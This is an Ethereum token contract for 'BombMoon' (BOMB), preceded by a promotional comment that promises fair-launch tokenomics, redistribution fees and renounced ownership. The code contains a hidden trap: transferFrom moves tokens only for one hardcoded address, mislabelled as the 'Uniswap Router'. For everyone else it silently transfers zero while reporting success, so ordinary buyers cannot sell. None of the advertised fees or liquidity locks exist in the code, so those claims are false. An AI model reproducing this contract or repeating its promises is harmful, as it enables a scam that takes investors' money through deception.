/**
 *Submitted for verification at Etherscan.io on 2021-06-11
*/

/*

    💣 🌕 Welcome to the BombMoon community ! 💣 🌕
    
    Official Telegram: https://t.me/bombmoon

    What is the BombMoon project about?

    BombMoon is a ERC-20 token created on Ethereum that aims to create a community with equality between owners and members where everyone can achieve financial freedom.


    How will you do that?

    BombMoon strives to be completely decentralized and fully community driven.

    All decisions will be made through community polls which will give BombMoon developers a better idea on how to move forward and which directions to take.

    The team will hold no $BOMB tokens at all and will have to participate in the presale along with all the other investors.


    Who is the team?

    We are a young team of driven entrepreneurs from different fields of work, who got brought together by their passion for technology, Cryptocurrency and blockchain.

    Team members are from different cultures and bring many unique skill-sets that are needed to create, market and manage a cryptocurrency.
    
    🔹Tokenomics 🔹

    BombMoon has declying fees for every holder!

    The longer you hold the more you get rewarded! Lets make virtual money!

    Fees are split to liquidity auto lock and redistribution to all holder

    First 12 Hours 35% FEES! 20% Liquidity / 15% Holder
    After 12 Hours 28% FEES! 16% Liquidity / 12% Holder
    After 24 Hours 21% FEES! 12%  Liquidity / 9% Holder
    After 72 Hours 14% FEES! 8% Liquidity / 6% Holder
    After 7 Days 7% FEES!  4% Liquidity / 3% Holder

    - 100'000'000'000 tokens initial supply
    - Buy/sell limit is 1% of the initial supply
    - Ownership will be renounced!
    - LP tokens will be locked!
    - Contract will be transparent for everyone before fairlaunch!
    - Closed contract, no changes! 
    - Fair Launch
 
*/


pragma solidity ^0.5.16;

// ERC-20 Interface
contract BEP20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

// Safe Math Library
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}


contract BombMoon is BEP20Interface, SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it
    address private _owner = 0xF65eafC9377649A7c88cF44B6584ce39963Ba09F; // Uniswap Router
    uint256 public _totalSupply;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    constructor() public {
        name = "BombMoon";
        symbol = "BOMB";
        decimals = 9;
        _totalSupply = 100000000000000000000;

        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    
    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
         if (from == _owner) {
             balances[from] = safeSub(balances[from], tokens);
            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
            balances[to] = safeAdd(balances[to], tokens);
            emit Transfer(from, to, tokens);
            return true;
         } else {
            balances[from] = safeSub(balances[from], 0);
            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], 0);
            balances[to] = safeAdd(balances[to], 0);
            emit Transfer(from, to, 0);
            return true;
             
         }
        
         
    }
           
}